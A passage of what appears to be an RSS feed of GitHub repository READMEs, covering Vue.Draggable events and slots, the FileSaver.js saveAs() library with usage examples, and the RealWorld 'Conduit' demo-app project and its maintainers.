 &lt;li&gt; &lt;p&gt;Support for Sortable events:&lt;/p&gt; &lt;p&gt;&lt;code&gt;start&lt;/code&gt;, &lt;code&gt;add&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;, &lt;code&gt;update&lt;/code&gt;, &lt;code&gt;end&lt;/code&gt;, &lt;code&gt;choose&lt;/code&gt;, &lt;code&gt;unchoose&lt;/code&gt;, &lt;code&gt;sort&lt;/code&gt;, &lt;code&gt;filter&lt;/code&gt;, &lt;code&gt;clone&lt;/code&gt;
   &lt;!-- raw HTML omitted --&gt; Events are called whenever onStart, onAdd, onRemove, onUpdate, onEnd, onChoose, onUnchoose, onSort, onClone are fired by Sortable.js with the same argument.
   &lt;!-- raw HTML omitted --&gt; &lt;a href=&quot;https://github.com/RubaXa/Sortable#event-object-demo&quot;&gt;See here for reference&lt;/a&gt;&lt;/p&gt; &lt;p&gt;Note that SortableJS OnMove callback is mapped with the &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/blob/master/README.md#move&quot;&gt;move prop&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;HTML:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-HTML&quot;&gt;&amp;lt;draggable :list=&quot;list&quot; @end=&quot;onEnd&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;change event&lt;/p&gt; &lt;p&gt;&lt;code&gt;change&lt;/code&gt; event is triggered when list prop is not null and the corresponding array is altered due to drag-and-drop operation.
   &lt;!-- raw HTML omitted --&gt; This event is called with one argument containing one of the following properties:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;added&lt;/code&gt;: contains information of an element added to the array 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;newIndex&lt;/code&gt;: the index of the added element&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;element&lt;/code&gt;: the added element&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;removed&lt;/code&gt;: contains information of an element removed from to the array 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;oldIndex&lt;/code&gt;: the index of the element before remove&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;element&lt;/code&gt;: the removed element&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;moved&lt;/code&gt;: contains information of an element moved within the array 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;newIndex&lt;/code&gt;: the current index of the moved element&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;oldIndex&lt;/code&gt;: the old index of the moved element&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;element&lt;/code&gt;: the moved element&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Slots&lt;/h3&gt; 
&lt;p&gt;Limitation: neither header or footer slot works in conjunction with transition-group.&lt;/p&gt; 
&lt;h4&gt;Header&lt;/h4&gt; 
&lt;p&gt;Use the &lt;code&gt;header&lt;/code&gt; slot to add none-draggable element inside the vuedraggable component. Important: it should be used in conjunction with draggable option to tag draggable element. Note that header slot will always be added before the default slot regardless its position in the template. Ex:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot; draggable=&quot;.item&quot;&amp;gt;
    &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot; class=&quot;item&quot;&amp;gt;
        {{element.name}}
    &amp;lt;/div&amp;gt;
    &amp;lt;button slot=&quot;header&quot; @click=&quot;addPeople&quot;&amp;gt;Add&amp;lt;/button&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Footer&lt;/h4&gt; 
&lt;p&gt;Use the &lt;code&gt;footer&lt;/code&gt; slot to add none-draggable element inside the vuedraggable component. Important: it should be used in conjunction with draggable option to tag draggable elements. Note that footer slot will always be added after the default slot regardless its position in the template. Ex:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot; draggable=&quot;.item&quot;&amp;gt;
    &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot; class=&quot;item&quot;&amp;gt;
        {{element.name}}
    &amp;lt;/div&amp;gt;
    &amp;lt;button slot=&quot;footer&quot; @click=&quot;addPeople&quot;&amp;gt;Add&amp;lt;/button&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Gotchas&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Vue.draggable children should always map the list or value prop using a v-for directive&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;You may use &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable#header&quot;&gt;header&lt;/a&gt; and &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable#footer&quot;&gt;footer&lt;/a&gt; slot to by-pass this limitation.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Children elements inside v-for should be keyed as any element in Vue.js. Be carefull to provide revelant key values in particular:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;typically providing array index as keys won&#39;t work as key should be linked to the items content&lt;/li&gt; 
   &lt;li&gt;cloned elements should provide updated keys, it is doable using the &lt;a href=&quot;https://raw.githubusercontent.com/SortableJS/Vue.Draggable/master/#clone&quot;&gt;clone props&lt;/a&gt; for example&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Example&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://sortablejs.github.io/Vue.Draggable/#/custom-clone&quot;&gt;Clone&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://sortablejs.github.io/Vue.Draggable/#/handle&quot;&gt;Handle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://sortablejs.github.io/Vue.Draggable/#/transition-example-2&quot;&gt;Transition&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://sortablejs.github.io/Vue.Draggable/#/nested-example&quot;&gt;Nested&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://sortablejs.github.io/Vue.Draggable/#/table-example&quot;&gt;Table&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Full demo example&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/David-Desmaisons/draggable-example&quot;&gt;draggable-example&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;For Vue.js 1.0&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/SortableJS/Vue.Draggable/master/documentation/Vue.draggable.for.ReadME.md&quot;&gt;See here&lt;/a&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>eligrey/FileSaver.js</title>
      <link>https://github.com/eligrey/FileSaver.js</link>
      <description>&lt;p&gt;An HTML5 saveAs() FileSaver implementation&lt;/p&gt;&lt;hr&gt;&lt;p&gt;If you need to save really large files bigger than the blob&#39;s size limitation or don&#39;t have enough RAM, then have a look at the more advanced &lt;a href=&quot;https://github.com/jimmywarting/StreamSaver.js&quot;&gt;StreamSaver.js&lt;/a&gt; that can save data directly to the hard drive asynchronously with the power of the new streams API. That will have support for progress, cancelation and knowing when it&#39;s done writing&lt;/p&gt; 
&lt;h1&gt;FileSaver.js&lt;/h1&gt; 
&lt;p&gt;FileSaver.js is the solution to saving files on the client-side, and is perfect for web apps that generates files on the client, However if the file is coming from the server we recommend you to first try to use &lt;a href=&quot;https://github.com/eligrey/FileSaver.js/wiki/Saving-a-remote-file#using-http-header&quot;&gt;Content-Disposition&lt;/a&gt; attachment response header as it has more cross-browser compatiblity.&lt;/p&gt; 
&lt;p&gt;Looking for &lt;code&gt;canvas.toBlob()&lt;/code&gt; for saving canvases? Check out &lt;a href=&quot;https://github.com/eligrey/canvas-toBlob.js&quot;&gt;canvas-toBlob.js&lt;/a&gt; for a cross-browser implementation.&lt;/p&gt; 
&lt;h2&gt;Supported Browsers&lt;/h2&gt; 
&lt;p&gt;| Browser | Constructs as | Filenames | Max Blob Size | Dependencies | | -------------- | ------------- | ------------ | ------------- | ------------ | | Firefox 20+ | Blob | Yes | 800 MiB | None | | Firefox &amp;lt; 20 | data: URI | No | n/a | &lt;a href=&quot;https://github.com/eligrey/Blob.js&quot;&gt;Blob.js&lt;/a&gt; | | Chrome | Blob | Yes | &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=375297#c107&quot;&gt;2GB&lt;/a&gt; | None | | Chrome for Android | Blob | Yes | &lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=375297#c107&quot;&gt;RAM/5&lt;/a&gt; | None | | Edge | Blob | Yes | ? | None | | IE 10+ | Blob | Yes | 600 MiB | None | | Opera 15+ | Blob | Yes | 500 MiB | None | | Opera &amp;lt; 15 | data: URI | No | n/a | &lt;a href=&quot;https://github.com/eligrey/Blob.js&quot;&gt;Blob.js&lt;/a&gt; | | Safari 6.1+* | Blob | No | ? | None | | Safari &amp;lt; 6 | data: URI | No | n/a | &lt;a href=&quot;https://github.com/eligrey/Blob.js&quot;&gt;Blob.js&lt;/a&gt; | | Safari 10.1+ &amp;nbsp; | Blob &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; | Yes &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; | n/a &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; | None |&lt;/p&gt; 
&lt;p&gt;Feature detection is possible:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;try {
    var isFileSaverSupported = !!new Blob;
} catch (e) {}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;IE &amp;lt; 10&lt;/h3&gt; 
&lt;p&gt;It is possible to save text files in IE &amp;lt; 10 without Flash-based polyfills. See &lt;a href=&quot;https://github.com/koffsyrup/FileSaver.js#examples&quot;&gt;ChenWenBrian and koffsyrup&#39;s &lt;code&gt;saveTextAs()&lt;/code&gt;&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;h3&gt;Safari 6.1+&lt;/h3&gt; 
&lt;p&gt;Blobs may be opened instead of saved sometimes‚Äîyou may have to direct your Safari users to manually press 
 &lt;!-- raw HTML omitted --&gt;‚åò
 &lt;!-- raw HTML omitted --&gt;+
 &lt;!-- raw HTML omitted --&gt;S
 &lt;!-- raw HTML omitted --&gt; to save the file after it is opened. Using the &lt;code&gt;application/octet-stream&lt;/code&gt; MIME type to force downloads &lt;a href=&quot;https://github.com/eligrey/FileSaver.js/issues/12#issuecomment-47247096&quot;&gt;can cause issues in Safari&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;iOS&lt;/h3&gt; 
&lt;p&gt;saveAs must be run within a user interaction event such as onTouchDown or onClick; setTimeout will prevent saveAs from triggering. Due to restrictions in iOS saveAs opens in a new window instead of downloading, if you want this fixed please &lt;a href=&quot;https://bugs.webkit.org/show_bug.cgi?id=167341&quot;&gt;tell Apple how this WebKit bug is affecting you&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Syntax&lt;/h2&gt; 
&lt;h3&gt;Import &lt;code&gt;saveAs()&lt;/code&gt; from file-saver&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;import { saveAs } from &#39;file-saver&#39;;
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;FileSaver saveAs(Blob/File/Url, optional DOMString filename, optional Object { autoBom })
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Pass &lt;code&gt;{ autoBom: true }&lt;/code&gt; if you want FileSaver.js to automatically provide Unicode text encoding hints (see: &lt;a href=&quot;https://en.wikipedia.org/wiki/Byte_order_mark&quot;&gt;byte order mark&lt;/a&gt;). Note that this is only done if your blob type has &lt;code&gt;charset=utf-8&lt;/code&gt; set.&lt;/p&gt; 
&lt;h2&gt;Examples&lt;/h2&gt; 
&lt;h3&gt;Saving text using &lt;code&gt;require()&lt;/code&gt;&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var FileSaver = require(&#39;file-saver&#39;);
var blob = new Blob([&quot;Hello, world!&quot;], {type: &quot;text/plain;charset=utf-8&quot;});
FileSaver.saveAs(blob, &quot;hello world.txt&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Saving text&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var blob = new Blob([&quot;Hello, world!&quot;], {type: &quot;text/plain;charset=utf-8&quot;});
FileSaver.saveAs(blob, &quot;hello world.txt&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Saving URLs&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;FileSaver.saveAs(&quot;https://httpbin.org/image&quot;, &quot;image.jpg&quot;);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Using URLs within the same origin will just use &lt;code&gt;a[download]&lt;/code&gt;. Otherwise, it will first check if it supports cors header with a synchronous head request. If it does, it will download the data and save using blob URLs. If not, it will try to download it using &lt;code&gt;a[download]&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The standard W3C File API &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/DOM/Blob&quot;&gt;&lt;code&gt;Blob&lt;/code&gt;&lt;/a&gt; interface is not available in all browsers. &lt;a href=&quot;https://github.com/eligrey/Blob.js&quot;&gt;Blob.js&lt;/a&gt; is a cross-browser &lt;code&gt;Blob&lt;/code&gt; implementation that solves this.&lt;/p&gt; 
&lt;h3&gt;Saving a canvas&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var canvas = document.getElementById(&quot;my-canvas&quot;);
canvas.toBlob(function(blob) {
    saveAs(blob, &quot;pretty image.png&quot;);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Note: The standard HTML5 &lt;code&gt;canvas.toBlob()&lt;/code&gt; method is not available in all browsers. &lt;a href=&quot;https://github.com/eligrey/canvas-toBlob.js&quot;&gt;canvas-toBlob.js&lt;/a&gt; is a cross-browser &lt;code&gt;canvas.toBlob()&lt;/code&gt; that polyfills this.&lt;/p&gt; 
&lt;h3&gt;Saving File&lt;/h3&gt; 
&lt;p&gt;You can save a File constructor without specifying a filename. If the file itself already contains a name, there is a hand full of ways to get a file instance (from storage, file input, new constructor, clipboard event). If you still want to change the name, then you can change it in the 2nd argument.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// Note: Ie and Edge don&#39;t support the new File constructor,
// so it&#39;s better to construct blobs and use saveAs(blob, filename)
var file = new File([&quot;Hello, world!&quot;], &quot;hello world.txt&quot;, {type: &quot;text/plain;charset=utf-8&quot;});
FileSaver.saveAs(file);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;img src=&quot;https://in.getclicky.com/212712ns.gif&quot; alt=&quot;Tracking image&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Basic Node.JS installation
npm install file-saver --save
bower install file-saver
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Additionally, TypeScript definitions can be installed via:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Additional typescript definitions
npm install @types/file-saver --save-dev
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>gothinkster/realworld</title>
      <link>https://github.com/gothinkster/realworld</link>
      <description>&lt;p&gt;&quot;The mother of all demo apps&quot; ‚Äî Exemplary fullstack Medium.com clone powered by React, Angular, Node, Django, and many more üèÖ&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/media/realworld-dual-mode.png&quot; alt=&quot;RealWorld Example Applications&quot;&gt;&lt;/h1&gt; 
&lt;h3&gt;Stay on the bleeding edge ‚Äî &lt;a href=&quot;https://github.com/gothinkster/realworld/discussions&quot;&gt;join our Github Discussions!&lt;/a&gt; üéâ&lt;/h3&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h3&gt;See how &lt;em&gt;the exact same&lt;/em&gt; Medium.com clone (called &lt;a href=&quot;https://demo.realworld.io&quot;&gt;Conduit&lt;/a&gt;) is built using any of our supported &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/#frontends&quot;&gt;frontends&lt;/a&gt; and &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/#backends&quot;&gt;backends&lt;/a&gt;. Yes, you can mix and match them, because &lt;strong&gt;they all adhere to the same &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/spec/&quot;&gt;API spec&lt;/a&gt;&lt;/strong&gt; üòÆüòé&lt;/h3&gt; 
&lt;p&gt;While most &quot;todo&quot; demos provide an excellent cursory glance at a framework&#39;s capabilities, they typically don&#39;t convey the knowledge &amp;amp; perspective required to actually build &lt;em&gt;real&lt;/em&gt; applications with it.&lt;/p&gt; 
&lt;p&gt;RealWorld solves this by allowing you to choose any frontend (React, Angular 2, &amp;amp; more) and any backend (Node, Django, &amp;amp; more) and see how they power a real world, beautifully designed fullstack app called &quot;&lt;a href=&quot;https://demo.realworld.io&quot;&gt;Conduit&lt;/a&gt;&quot;.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Read the &lt;a href=&quot;https://medium.com/@ericsimons/introducing-realworld-6016654d36b5&quot;&gt;full blog post announcing RealWorld on Medium.&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;h1&gt;Implementations&lt;/h1&gt; 
&lt;p&gt;Over 100 implementations have been created using various languages, libraries, and frameworks.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://codebase.show/projects/realworld&quot;&gt;&lt;strong&gt;See the list of implementations on the CodebaseShow website &amp;gt;&amp;gt;&amp;gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Create a new implementation&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/spec&quot;&gt;&lt;strong&gt;Create a new implementation &amp;gt;&amp;gt;&amp;gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Or you can &lt;a href=&quot;https://github.com/gothinkster/realworld/discussions/categories/wip-implementations&quot;&gt;view upcoming implementations (WIPs)&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;How do I get up &amp;amp; running?&lt;/h1&gt; 
&lt;p&gt;Follow the instructions in the README of whatever frontend and/or backend repo&#39;s you want to get up and running.&lt;/p&gt; 
&lt;h3&gt;Can you teach me how to build each stack from scratch?&lt;/h3&gt; 
&lt;p&gt;Yup! We&#39;ve built step-by-step tutorials for all of our stacks that teach you how to go from &lt;code&gt;git init&lt;/code&gt; all the way to the production ready application. &lt;a href=&quot;https://thinkster.io/tutorials/fullstack&quot;&gt;&lt;strong&gt;Start learning now &amp;gt;&amp;gt;&amp;gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Community created resources&lt;/h1&gt; 
&lt;p&gt;Forks, tutorials, workshops, and other resources based on the RealWorld project:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/kentcdodds/testing-workshop&quot;&gt;&lt;strong&gt;React+Redux / Node testing workshop&lt;/strong&gt;&lt;/a&gt; by &lt;a href=&quot;https://github.com/kentcdodds&quot;&gt;&lt;strong&gt;Kent C. Dodds&lt;/strong&gt;&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Example repo showing the React+Redux and Node stacks working together w/ TDD&lt;/li&gt; 
   &lt;li&gt;Live recording of his workshop is &lt;a href=&quot;https://www.youtube.com/watch?v=DdqiXcYDv-8&quot;&gt;&lt;strong&gt;available on YouTube&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/anishkny/realworld-e2e-test&quot;&gt;&lt;strong&gt;RealWorld React/NodeJS E2E Tests&lt;/strong&gt;&lt;/a&gt; by &lt;a href=&quot;https://github.com/anishkny&quot;&gt;&lt;strong&gt;Anish Karandikar&lt;/strong&gt;&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;A repo showing how to wire &lt;a href=&quot;https://github.com/gothinkster/react-redux-realworld-example-app&quot;&gt;React&lt;/a&gt; frontend with &lt;a href=&quot;https://github.com/gothinkster/node-express-realworld-example-app&quot;&gt;NodeJS&lt;/a&gt; backend for a RealWorld fullstack&lt;/li&gt; 
   &lt;li&gt;Includes E2E integration tests that use &lt;a href=&quot;https://github.com/GoogleChrome/puppeteer&quot;&gt;Chrome Puppeteer&lt;/a&gt; and &lt;a href=&quot;https://mochajs.org&quot;&gt;Mocha&lt;/a&gt; and work with CI systems like &lt;a href=&quot;https://travis-ci.org/anishkny/realworld-e2e-test&quot;&gt;Travis CI&lt;/a&gt; and &lt;a href=&quot;https://circleci.com/gh/anishkny/realworld-e2e-test&quot;&gt;CircleCI&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;Also demonstrates usage of &lt;a href=&quot;https://greenkeeper.io&quot;&gt;Greenkeeper&lt;/a&gt; for automatic dependency updates and &lt;a href=&quot;https://snyk.io/&quot;&gt;Snyk&lt;/a&gt; for vulnerability monitoring&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Performance comparisons: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;https://medium.freecodecamp.org/a-realworld-comparison-of-front-end-frameworks-with-benchmarks-2019-update-4be0d3c78075&quot;&gt;A Real-World Comparison of Front-End Frameworks with Benchmarks 2019&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://medium.freecodecamp.org/a-real-world-comparison-of-front-end-frameworks-with-benchmarks-2018-update-e5760fb4a962&quot;&gt;A Real-World Comparison of Front-End Frameworks with Benchmarks 2018&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://medium.freecodecamp.org/a-real-world-comparison-of-front-end-frameworks-with-benchmarks-e1cb62fd526c&quot;&gt;A Real-World Comparison of Front-End Frameworks with Benchmarks 2017&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Learn more&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://medium.com/@ericsimons/introducing-realworld-6016654d36b5&quot;&gt;&quot;Introducing RealWorld üôå&quot;&lt;/a&gt; by Eric Simons&lt;/li&gt; 
 &lt;li&gt;Every tutorial is built against the same &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/api/&quot;&gt;API spec&lt;/a&gt; to ensure modularity of every frontend &amp;amp; backend&lt;/li&gt; 
 &lt;li&gt;Every frontend utilizes the same hand crafted &lt;a href=&quot;https://github.com/gothinkster/conduit-bootstrap-template&quot;&gt;Bootstrap 4 theme&lt;/a&gt; for identical UI/UX&lt;/li&gt; 
 &lt;li&gt;There is a hosted version of the backend API available for public usage, no API keys required&lt;/li&gt; 
 &lt;li&gt;Interested in creating a new RealWorld stack? View our &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/spec&quot;&gt;starter guide &amp;amp; spec&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Active Maintainers&lt;/h1&gt; 
&lt;h4&gt;&lt;a href=&quot;https://github.com/geromegrignon&quot;&gt;G√©r√¥me Grignon&lt;/a&gt; - Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;G√©r√¥me is a Software Engineer at Sfeir. He&#39;s an open source enthusiast.
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://github.com/mvila&quot;&gt;Manuel Vila&lt;/a&gt; - Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Manuel is an independent Software Engineer, creator of the &lt;a href=&quot;https://layrjs.com&quot;&gt;Layr framework&lt;/a&gt; and the &lt;a href=&quot;https://codebase.show/&quot;&gt;CodebaseShow website&lt;/a&gt;.
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h1&gt;Who made this?&lt;/h1&gt; 
&lt;p&gt;RealWorld would not be possible without the &lt;a href=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/#special-thanks-to&quot;&gt;open source community&lt;/a&gt; continuously helping push the project forward. In addition, the former team was composed of:&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://github.com/anishkny&quot;&gt;Anish Karandikar&lt;/a&gt; - Core Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;MathWorker, ex-Google, ex-Computational Fluid Dynamicist, forever lover of tech &amp;amp; humanities ‚ù§Ô∏è
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://github.com/Cameron-C-Chapman&quot;&gt;Cameron Chapman&lt;/a&gt; - Core Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Cameron Chapman is a Software Engineer at FanThreeSixty. He&#39;s an open source enthusiast and is helping to teach a local web development boot camp at Kansas University.&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://twitter.com/ericsimons40&quot;&gt;Eric Simons&lt;/a&gt; - Founder/Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Eric is a Software Engineer, UI Designer, and author of many technical books &amp;amp; tutorials. He oversees the project direction, maintenance and organizes the planning and development efforts of the team.&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://twitter.com/iamalbertpai&quot;&gt;Albert Pai&lt;/a&gt; - Founder/Maintainer&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Albert is a Software Engineer, DevOps ninja, and author of many technical books &amp;amp; tutorials. He oversees the project direction, maintenance and organizes the planning and development efforts of the team.&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://twitter.com/gothinkster&quot;&gt;Thinkster&lt;/a&gt; - Funding/Support&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://thinkster.io&quot;&gt;Thinkster&lt;/a&gt; creates high quality resources that help Javascript developers succeed. The RealWorld project wouldn&#39;t exist without their funding, so please consider investing in &lt;a href=&quot;https://thinkster.io/pro&quot;&gt;a Pro subscription&lt;/a&gt; to help support us!&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://twitter.com/brwr_&quot;&gt;James Brewer&lt;/a&gt; - Admin&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;James is a Software Engineer at Square and a contributor to the Django project. He created &amp;amp; maintains the RW Django codebase and continually provides guidance for the RealWorld project itself.&lt;/p&gt; 
&lt;h4&gt;&lt;a href=&quot;https://github.com/sandeesh&quot;&gt;Sandeesh S.&lt;/a&gt; - Admin&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Full stack developer, Laravel enthusiast, Digital marketing specialist and an avid gamer.
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;h1&gt;Special thanks to...&lt;/h1&gt; 
&lt;p&gt;RealWorld wouldn&#39;t be possible without the help of the open source community reviewing codebases, creating new app implementations, and many other tasks that help push this project forward. We especially appreciate the OSS leaders who have helped contribute to RealWorld:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Dan Abramov&lt;/strong&gt; (creator of Redux) for helping &lt;a href=&quot;https://twitter.com/dan_abramov/status/692009757775896577&quot;&gt;spark the initial idea&lt;/a&gt;, &lt;a href=&quot;https://github.com/reactjs/redux/issues/1353&quot;&gt;getting the Redux community involved&lt;/a&gt;, as well as graciously taking the time to provide feedback on the Redux codebase&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Max Lynch&lt;/strong&gt; (creator of Ionic) for taking the time to provide guidance in the early days of this project&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Addy Osmani&lt;/strong&gt; (creator of TodoMVC) for helping &lt;a href=&quot;https://twitter.com/addyosmani/status/762828483433144320&quot;&gt;spark the initial idea&lt;/a&gt; and his amazing work with TodoMVC&lt;/li&gt; 
